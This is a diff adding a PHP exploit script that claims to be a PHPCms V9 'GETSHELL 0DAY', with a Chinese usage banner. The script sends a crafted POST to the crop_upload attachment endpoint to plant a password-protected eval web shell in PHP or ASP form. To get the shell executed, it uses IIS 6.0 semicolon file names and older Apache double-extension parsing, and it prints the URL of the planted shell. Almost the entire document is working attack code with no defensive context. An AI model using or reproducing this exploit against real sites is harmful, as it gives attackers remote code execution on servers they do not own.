@@ -1,0 +1,208 @@
+<?php
+ 
+
+error_reporting(E_ERROR);
+ 
+
+set_time_limit(0);
+ 
+
+$pass="fuck";
+ 
+
+print_r('
+ 
+
++---------------------------------------------------------------------------+
+ 
+
+PHPCms V9 GETSHELL 0DAY 
+c0de by testr00ttest
+ 
+
+针对iis6.0的漏洞 有点鸡肋 但是也可以用
+ 
+
+apache 是老版本可能会产生问题
+ 
+
++---------------------------------------------------------------------------+
+ 
+
+');
+ 
+
+echo '密码为'.$pass;
+ 
+
+if ($argc < 2) {
+ 
+
+print_r('
+ 
+
++---------------------------------------------------------------------------+
+ 
+
+Usage: php '.$argv[0].' url [js] 
+js 类型配置  1为asp 2为php  3为apache 的版本
+ 
+
+Example:
+ 
+
+php '.$argv[0].' localhost 1 
++---------------------------------------------------------------------------+
+ 
+
+');
+ 
+
+exit;
+ 
+
+}
+ 
+
+$url=$argv[1];
+ 
+
+$js=$argv[2];//写入脚本类型
+ 
+
+
+$phpshell='<?php @eval($_POST[\''.$pass.'\']);?>';
+ 
+
+$aspshell='<%eval request("'.$pass.'")%>';
+ 
+
+
+if($js==1){
+ 
+
+        $file="1.asp;1.jpg";
+ 
+
+         $ret=GetShell($url,$aspshell,$file);
+ 
+
+        
+ 
+
+}else if($js==2){
+ 
+
+        $file="1.php;1.jpg";
+ 
+
+        $ret=GetShell($url,$phpshell,$file);
+ 
+
+}else if($js==3){
+ 
+
+        $file="1.php.jpg";
+ 
+
+        $ret=GetShell($url,$phpshell,$file);
+ 
+
+}else{
+ 
+
+        print_r('没有选择脚本类型');
+ 
+
+}
+ 
+
+$pattern = "|http:\/\/[^,]+?\.jpg,?|U";
+ 
+
+preg_match_all($pattern, $ret, $matches);
+ 
+
+if($matches[0][0]){
+ 
+
+        echo "\r\nurl地址:".$matches[0][0];
+ 
+
+}else{
+ 
+
+        echo "\r\n没得到！";        
+ 
+
+}
+ 
+
+
+function GetShell($url,$shell,$js){
+ 
+
+        $content =$shell;
+ 
+
+        $data = "POST /index.php?m=attachment&c=attachments&a=crop_upload&width=1&height=1&file=http://".$url."/uploadfile/".$js." HTTP/1.1\r\n"; 
+        $data .= "Host: ".$url."\r\n";
+ 
+
+        $data .= "User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\r\n";
+ 
+
+        $data .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
+ 
+
+        $data .= "Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\r\n";
+ 
+
+        $data .= "Connection: close\r\n";
+ 
+
+        $data .= "Content-Length: ".strlen($content)."\r\n\r\n";
+ 
+
+        $data .= $content."\r\n";
+ 
+
+        //echo $data;
+ 
+
+        $ock=fsockopen($url,80);
+ 
+
+        if (!$ock) {
+ 
+
+        echo "  No response from ".$url."\n";
+ 
+
+        }
+ 
+
+        fwrite($ock,$data);
+ 
+
+        $resp = '';
+ 
+
+        while (!feof($ock)) {
+ 
+
+                $resp.=fread($ock, 1024);
+ 
+
+        }
+ 
+
+        return $resp;
+ 
+
+}
+ 
+
+
+
+?>
